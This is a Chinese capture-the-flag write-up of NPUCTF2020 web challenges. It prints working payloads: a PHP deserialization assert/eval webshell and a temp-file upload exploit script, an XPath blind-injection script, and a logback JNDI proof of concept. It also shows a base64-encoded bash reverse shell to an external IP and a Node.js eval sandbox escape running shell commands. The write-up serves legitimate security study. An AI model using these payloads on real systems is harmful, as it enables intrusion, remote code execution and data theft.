+++
title = "NPUCTF2020"
slug = "npuctf2020"
description = "刷"
date = "2024-09-02T20:25:06"
lastmod = "2024-09-02T20:25:06"
image = ""
license = ""
categories = ["复现"]
tags = []
+++

# [NPUCTF2020]ReadlezPHP

`ctrl+u`看源码发现路由

```
<a href="./time.php?source"></a></p>
```

```php
<?php
#error_reporting(0);
class HelloPhp
{
    public $a;
    public $b;
    public function __construct(){
        $this->a = "Y-m-d h:i:s";
        $this->b = "date";
    }
    public function __destruct(){
        $a = $this->a;
        $b = $this->b;
        echo $b($a);
    }
}
$c = new HelloPhp;

if(isset($_GET['source']))
{
    highlight_file(__FILE__);
    die(0);
}

@$ppp = unserialize($_GET["data"]);
```

我想着是能直接打木马进去但是发现链接之后啥都没有，那就看`phpinfo()`,得到了`flag`

```php
<?php
class HelloPhp{
    public $a;
    public $b;
    public function __construct(){
        $this->a='phpinfo()';
        // $this->a='eval($_POST[a]);';
        $this->b='assert';
    }
}
echo serialize(new HelloPhp());
```

题目环境中我认为`eval`和`include`以及`call_user_func`都是可以用的但是一用就会出现网页无法运作的页面

# [NPUCTF2020]ezinclude

进入之后进行传参发现需要构造`cookie`

```
Request:

GET /?username=admin&password=admin HTTP/1.1
Host: 92069c2f-6fd0-43a7-a6c9-7f699a22c1da.node5.buuoj.cn:81
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: Hash=fa25e54758d5d5c1927781a6ede89f8a
Connection: close
```

```
Response:

HTTP/1.1 200 OK
Server: openresty
Date: Tue, 03 Sep 2024 11:06:02 GMT
Content-Type: text/html; charset=UTF-8
Content-Length: 73
Connection: close
X-Powered-By: PHP/7.0.33
Set-Cookie: Hash=fa25e54758d5d5c1927781a6ede89f8a; expires=Tue, 15-Oct-2024 03:06:02 GMT; Max-Age=3600000
Vary: Accept-Encoding
Cache-Control: no-cache

username/password error<html>
<!--md5($secret.$name)===$pass -->
</html>
```

这里拿到提示之后其实第一时间并不是很明白，怎么整，后面看到说md5强等于`pass`,然后尝试了一下发包发现路由

```
Request:

GET /?name=admin&pass=973225ae4fc8977f86d1a330b0774630 HTTP/1.1
Host: 92069c2f-6fd0-43a7-a6c9-7f699a22c1da.node5.buuoj.cn:81
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: Hash=973225ae4fc8977f86d1a330b0774630;expires=Tue, 15-Oct-2024 03:06:02 GMT; Max-Age=3600000
Connection: close
```

```
Response:

HTTP/1.1 200 OK
Server: openresty
Date: Tue, 03 Sep 2024 11:10:09 GMT
Content-Type: text/html; charset=UTF-8
Content-Length: 165
Connection: close
X-Powered-By: PHP/7.0.33
Vary: Accept-Encoding
Cache-Control: no-cache

<script language="javascript" type="text/javascript">
           window.location.href="flflflflag.php";
	</script>
<html>
<!--md5($secret.$name)===$pass -->
</html>
```

发现这个

```html
<body>
    include($_GET["file"])
</body>
```

那么这里应该就是任意文件读取了

```
/flflflflag.php?file=php://filter/read=convert.base64-encode/resource=index.php
```

```php
<?php
include 'config.php';
@$name=$_GET['name'];
@$pass=$_GET['pass'];
if(md5($secret.$name)===$pass){
	echo '<script language="javascript" type="text/javascript">
           window.location.href="flflflflag.php";
	</script>
';
}else{
	setcookie("Hash",md5($secret.$name),time()+3600000);
	echo "username/password error";
}
?>
```

貌似是没有什么用，但是可以继续读取`config.php`

```php
<?php
$secret='%^$&$#fffdflag_is_not_here_ha_ha';
?>
```

也还是没有利用点，这里扫描一下后台了只有

```
[200][text/html; charset=UTF-8][0b] http://92069c2f-6fd0-43a7-a6c9-7f699a22c1da.node5.buuoj.cn:81/config.php                                               
[200][text/html; charset=UTF-8][62.00b] http://92069c2f-6fd0-43a7-a6c9-7f699a22c1da.node5.buuoj.cn:81/dir.php 
```

继续读取

```php
<?php
var_dump(scandir('/tmp'));
?>
```

这里是可以打印临时文件夹中的文件，但是还是看不到内容哇

这里我们已知版本为`7.0.33`

> 使用php://filter/string.strip_tags导致php崩溃清空堆栈重启，如果在同时上传了一个文件，那么这个tmp file就会一直留在tmp目录，再进行文件名爆破就可以getshell。这个崩溃原因是存在一处空指针引用。

• php7.0.0-7.1.2可以利用， 7.1.2x版本的已被修复

• php7.1.3-7.2.1可以利用， 7.2.1x版本的已被修复

• php7.2.2-7.2.8可以利用， 7.2.9一直到7.3到现在的版本已被修复

那么可以打

```python
import requests
# 用于处理二进制数据
from io import BytesIO

payload="<?php eval($_POST[a]);?>"
# 封装成一个文件
data={'file':BytesIO(payload.encode())}

url="http://92069c2f-6fd0-43a7-a6c9-7f699a22c1da.node5.buuoj.cn:81/"
try:
    r=requests.post(url=url+"flflflflag.php?file=php://filter/read=string.strip_tags/resource=/etc/passwd",files=data,allow_redirects=False)
except:
    print("nonono!!!")
```

访问一下`/dir.php`,拿到文件名

```
Request:

POST /flflflflag.php?file=/tmp/phpGZ9vgF HTTP/1.1
Host: 92069c2f-6fd0-43a7-a6c9-7f699a22c1da.node5.buuoj.cn:81
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: Hash=973225ae4fc8977f86d1a330b0774630;expires=Tue, 15-Oct-2024 03:06:02 GMT; Max-Age=3600000
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 12

a=phpinfo();
```

但是很奇怪为什么这里不能RCE仅仅只能进行一个`phpinfo()`呢

# [NPUCTF2020]web🐕

## Padding Oracle原理深度解析&CBC字节翻转攻击原理解析

[教程](https://mp.weixin.qq.com/s/OtGw-rALwpBkERfvqdZ4kQ)

首先把附件反编译了

```java
package defpackage;

/* renamed from: HelloWorld  reason: default package */
/* loaded from: HelloWorld.class */
public class HelloWorld {
    public static void main(String[] strArr) {
        System.out.println("众所周知，你是一名WEB选手，掌握javaweb也是一项必备技能，那么逆向个java应该不过分吧？");
        byte[] bArr = {102, 108, 97, 103, 123, 119, 101, 54, 95, 52, 111, 103, 95, 49, 115, 95, 101, 52, 115, 121, 103, 48, 105, 110, 103, 125};
    }
}
```

直接就出了？

```python
a=[102, 108, 97, 103, 123, 119, 101, 54, 95, 52, 111, 103, 95, 49, 115, 95, 101, 52, 115, 121, 103, 48, 105, 110, 103, 125]
for i in a:
    print(chr(i),end="")
```

怎么都是密码的东西giao了，后面专门拿一天来研究！！！

# [NPUCTF2020]ezlogin

## XPATH注入

像这种注入的东西，就直接把他闭合重新插入查询语句即可，那现在来了解一下查询语句类似于下面

```xml
"/root/users/user[username/text()='".$name."' and password/text()='".$pwd."']";
```

那么此处我插入

`$name=admin'or '1'='1`

```xml
"/root/users/user[username/text()='admin'or '1'='1'  and password/text()='".$pwd."']";
系统解析之后
username/text()='admin' or ('1'='1' and password/text()='".$pwd."')
那么不为永真
```

`$name=amdin'or '1'='1' or ''='`

```
"/root/users/user[username/text()='amdin'or '1'='1' or ''='' and password/text()='".$pwd."']";
系统解析为
username/text()='admin' or 1=1 or (''='' and password/text()='".$pwd."')
即为恒真式子
```

> ''=''为什么也是恒真，其实很简单，因为两个空字符串恒相等

注意:的是在`xpath`的查询语句中**没有注释**。

那么现在进入环境发现是一个登录界面，直接在`username`进行测试，发现确实是注入点

```
Request:

POST /login.php HTTP/1.1
Host: d5d1f209-06f6-4184-98f4-ae13b1165d56.node5.buuoj.cn:81
Content-Length: 117
Accept: */*
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
Content-Type: application/xml
Origin: http://d5d1f209-06f6-4184-98f4-ae13b1165d56.node5.buuoj.cn:81
Referer: http://d5d1f209-06f6-4184-98f4-ae13b1165d56.node5.buuoj.cn:81/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=96d4e320796f9c0451d08dd94cbeecc0
Connection: close

<username>admin'or count(/)=2 or ''='</username><password>1</password><token>90fec838b90f780e86586506b7c98Tcy</token>
```

而且是`xml`，那么`xxe`不通的话就很有可能是`xpath`注入了

```xml
admin'or count(/)=1 or ''='    //看有几个节点
登录超时，请刷新页面重试！
admin'or count(/)=2 or ''='   
用户名或密码错误!
```

有不同回显估计是个盲注

那么一样的测试行不行

```xml
admin'or substring(name/*[1],1,1)>'a' or ''='
```

介于没有等同于`ascii`函数的函数所以只能用字符了

并且发现这个`token`每次都会刷新，那么我们写个脚本来打出结果

```python
import requests
import re

sess=requests.session()
url="http://976f29e9-a30a-4b01-9795-6a3b83887666.node5.buuoj.cn:81/login.php"
headers={
    'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36',
    'Content-Type':'application/xml'
}
# 捕捉token
find=re.compile('<input type="hidden" id="token" value="(.*?)" />')

str="abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ-{}"

target=""
for i in range(1,100):
    for j in str:
        r=sess.post(url=url)
        token=find.findall(r.text)
        # 查第一个元素节点
        # payload = "<username>admin'or substring(name(/*[1]),{},1)='{}' or ''='</username><password>1</password><token>{}</token>".format(i,j,token[0])
        # 查root的第一个子元素节点
        # payload = "<username>admin'or substring(name(/root/*[1]),{},1)='{}' or ''='</username><password>1</password><token>{}</token>".format(i,j,token[0])
        # 查accounts的第一个子元素节点
        # payload = "<username>admin'or substring(name(/root/accounts/*[1]),{},1)='{}' or ''='</username><password>1</password><token>{}</token>".format(i,j,token[0])
        # 查user的第二个元素节点
        # payload = "<username>admin'or substring(name(/root/accounts/user/*[2]),{},1)='{}' or ''='</username><password>1</password><token>{}</token>".format(i,j,token[0])
        # 查username
        # payload = "<username>admin'or substring(/root/accounts/user[2]/username/text(),{},1)='{}' or ''='</username><password>1</password><token>{}</token>".format(i,j,token[0])
        # adm1n
        # 查password
        payload = "<username>admin'or substring(/root/accounts/user[2]/password/text(),{},1)='{}' or ''='</username><password>1</password><token>{}</token>".format(i,j,token[0])
        # cf7414b5bdb2e65ee43083f4ddbc4d9f
        
        print(payload)

        r= sess.post(url=url,headers=headers,data=payload)
        print(r.text)

        if "非法操作" in r.text:
            target+=j
            print(target)
            break

    if "用户名或密码错误!" in r.text:
        break

print("answer:"+target)
```

最后md5解密得到密码是`gtfly123`

登录之后源代码里面

```
ZmxhZyBpcyBpbiAvZmxhZwo=

flag is in /flag
```

并且发现页面有任意文件读取

```
/admin.php?file=pHp://filter/convert.Base64-encode/resource=/flag
```

多次尝试绕过一下就可以了

# [NPUCTF2020]EzShiro

## CVE-2019-14439

是由logback 引起的 jndi 注入

**poc**

```java
package Jackson;


import com.fasterxml.jackson.databind.ObjectMapper;

import java.io.IOException;

public class logback {

    public static void main(String[] args) throws IOException, IOException {

				String json = "[\"ch.qos.logback.core.db.JNDIConnectionSource\"," +
                "{\"jndiLocation\":\"ldap://127.0.0.1:1089/Exploit\"}]";
        ObjectMapper mapper = new ObjectMapper();
        mapper.enableDefaultTyping();
        Object o = mapper.readValue(json, Object.class);
        mapper.writeValueAsString(o);
    }

}
```

进入环境本身应该是有一个这样的`pom.xml`

```xml
<dependencies>
    <dependency>
      <groupId>org.springframework.boot</groupId>
      <artifactId>spring-boot-starter-web</artifactId>
    </dependency>

    <dependency>
      <groupId>org.apache.shiro</groupId>
      <artifactId>shiro-web</artifactId>
      <version>1.5.1</version>
    </dependency>
    <dependency>
      <groupId>org.apache.shiro</groupId>
      <artifactId>shiro-spring</artifactId>
      <version>1.5.1</version>
    </dependency>
    <dependency>
      <groupId>ch.qos.logback</groupId>
      <artifactId>logback-core</artifactId>
      <version>1.2.1</version>
    </dependency>
    <dependency>
      <groupId>commons-collections</groupId>
      <artifactId>commons-collections</artifactId>
      <version>3.2.1</version>
    </dependency>
  </dependencies>
```

那么直接使用工具吧(java我的爱，但是不会)

**ysomap工具**

```shell
java -jar ysomap.jar cli

use exploit LDAPLocalChainListener
set lport 6688
use payload  CommonsCollections7
use bullet TransformerBullet
set version 3
set command 'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMDYuNTQuMjM5LjIzLzk5OTkgMD4mMQ==}|{base64,-d}|{bash,-i}'
run
```

但是我运行java文件是没有成功的，而且这个工具也没有cc8，真是奇怪了，那个师傅怎么成功的呢

# [NPUCTF2020]验证🐎

呆jio不，不会哇，看着学习一下吧

```js
const express = require('express');
const bodyParser = require('body-parser');
const cookieSession = require('cookie-session');

const fs = require('fs');
const crypto = require('crypto');

const keys = require('./key.js').keys;

function md5(s) {
  return crypto.createHash('md5')
    .update(s)
    .digest('hex');
}

function saferEval(str) {
  if (str.replace(/(?:Math(?:\.\w+)?)|[()+\-*/&|^%<>=,?:]|(?:\d+\.?\d*(?:e\d+)?)| /g, '')) {
    return null;
  }
  return eval(str);
} // 2020.4/WORKER1 淦，上次的库太垃圾，我自己写了一个

const template = fs.readFileSync('./index.html').toString();
function render(results) {
  return template.replace('{{results}}', results.join('<br/>'));
}

const app = express();

app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());

app.use(cookieSession({
  name: 'PHPSESSION', // 2020.3/WORKER2 嘿嘿，给👴爪⑧
  keys
}));

Object.freeze(Object);
Object.freeze(Math);

app.post('/', function (req, res) {
  let result = '';
  const results = req.session.results || [];
  const { e, first, second } = req.body;
  if (first && second && first.length === second.length && first!==second && md5(first+keys[0]) === md5(second+keys[0])) {
    if (req.body.e) {
      try {
        result = saferEval(req.body.e) || 'Wrong Wrong Wrong!!!';
      } catch (e) {
        console.log(e);
        result = 'Wrong Wrong Wrong!!!';
      }
      results.unshift(`${req.body.e}=${result}`);
    }
  } else {
    results.unshift('Not verified!');
  }
  if (results.length > 13) {
    results.pop();
  }
  req.session.results = results;
  res.send(render(req.session.results));
});

// 2019.10/WORKER1 老板娘说她要看到我们的源代码，用行数计算KPI
app.get('/source', function (req, res) {
  res.set('Content-Type', 'text/javascript;charset=utf-8');
  res.send(fs.readFileSync('./index.js'));
});

app.get('/', function (req, res) {
  res.set('Content-Type', 'text/html;charset=utf-8');
  req.session.admin = req.session.admin || 0;
  res.send(render(req.session.results = req.session.results || []))
});

app.listen(80, '0.0.0.0', () => {
  console.log('Start listening')
});
```

首先绕过那层md5，还是比较简单的，直接绕过就可以了

已知`keys[0]`固定，那么可以看成是这样子

```js
[1]+'1' //'11'
'1'+'1' //'11'
[1]!=='1'
```

```js
function saferEval(str) {
  if (str.replace(/(?:Math(?:\.\w+)?)|[()+\-*/&|^%<>=,?:]|(?:\d+\.?\d*(?:e\d+)?)| /g, '')) {
    return null;
  }
  return eval(str);
}
```

这里只有`math`和数字\一些符号啥的

定义一个匿名的**箭头函数**(参数为`Math`)

```
((Math) => { ... })
```

**对象的 `constructor` 属性**

> 在 JavaScript 中，每个对象都有一个 `constructor` 属性，它指向创建该对象的构造函数。
>
> Math是一个全局对象。通常来说，`Math.constructor` 默认返回的是 `Object` 构造函数,但是如果进行重定义`Math = Math.constructor;`那么Math就被指向了 `Function` 构造器,那么此时进行引用，就可以动态执行代码

```
Math.fromCharCode(114,101,116,117,114,110,32,103,108,111,98,97,108,46,112,114,111,99,101,115,115,46,109,97,105,110,77,111,100,117,108,101,46,99,111,110,115,116,114,117,99,116,111,114,46,95,108,111,97,100,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,101,120,101,99,83,121,110,99,40,39,99,97,116,32,47,102,108,97,103,39,41)
相当于
"return global.process.mainModule.constructor._load('child_process').execSync('cat /flag')"
```

```js
//第一个Math都是系统的全局对象
((Math)=>(
    // 将 Math 变量重新定义为一个数字（NaN）
    Math=Math+1,
    // 将 Math 重新定义为构造函数，实际上是将其设为 Function 构造器
    Math=Math.constructor,
    // 为 Math.x 设置为 Function 构造器
    Math.x=Math.constructor,
    Math.x(Math.fromCharCode(
            114,101,116,117,114,110,32,103,108,111,98,97,108,
            46,112,114,111,99,101,115,115,46,109,97,105,110,77,
            111,100,117,108,101,46,99,111,110,115,116,114,117,
            99,116,111,114,46,95,108,111,97,100,40,39,99,104,
            105,108,100,95,112,114,111,99,101,115,115,39,41,46,
            101,120,101,99,83,121,110,99,40,39,99,97,116,32,
            47,102,108,97,103,39,41))()
))(Math)  //这最后面的(Math)表示是马上调用这个匿名函数并且传参为Math
```

最后执行的命令也就是

```js
Function("return global.process.mainModule.constructor._load('child_process').execSync('cat /flag')")();
```

`payload`为

```js
((Math)=>(Math=Math+1,Math=Math.constructor,Math.x=Math.constructor,Math.x(Math.fromCharCode(114,101,116,117,114,110,32,103,108,111,98,97,108,46,112,114,111,99,101,115,115,46,109,97,105,110,77,111,100,117,108,101,46,99,111,110,115,116,114,117,99,116,111,114,46,95,108,111,97,100,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,101,120,101,99,83,121,110,99,40,39,99,97,116,32,47,102,108,97,103,39,41))()))(Math)
```

看包

```
Reqeust:

POST / HTTP/1.1
Host: 7ab969c2-18be-46f8-a2f9-ac22ba6bbe93.node5.buuoj.cn:81
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSION=eyJhZG1pbiI6MCwicmVzdWx0cyI6W119; PHPSESSION.sig=MikJCsYtbGqW_KtP9JUGEMqjQnk
If-None-Match: W/"5d8-+StfY5LUKLs0zK+qH9ldwZqpE98"
Connection: close
Content-Type: application/json
Content-Length: 590

{"e":"(Math=>(Math=Math+1,Math=Math.constructor,Math.x=Math.constructor(Math.fromCharCode(114, 101, 116, 117, 114, 110, 32, 103, 108, 111, 98, 97, 108, 46, 112, 114, 111, 99, 101, 115, 115, 46, 109, 97, 105, 110, 77, 111, 100, 117, 108, 101, 46, 99, 111, 110, 115, 116, 114, 117, 99, 116, 111, 114, 46, 95, 108, 111, 97, 100, 40, 39, 99, 104, 105, 108, 100, 95, 112, 114, 111, 99, 101, 115, 115, 39, 41, 46, 101, 120, 101, 99, 83, 121, 110, 99, 40, 39, 99, 97, 116, 32, 47, 102, 108, 97, 103, 39, 41, 46, 116, 111, 83, 116, 114, 105, 110, 103, 40, 41))()))(Math)", "first":"1","second":[1]}
```

好玩！！！
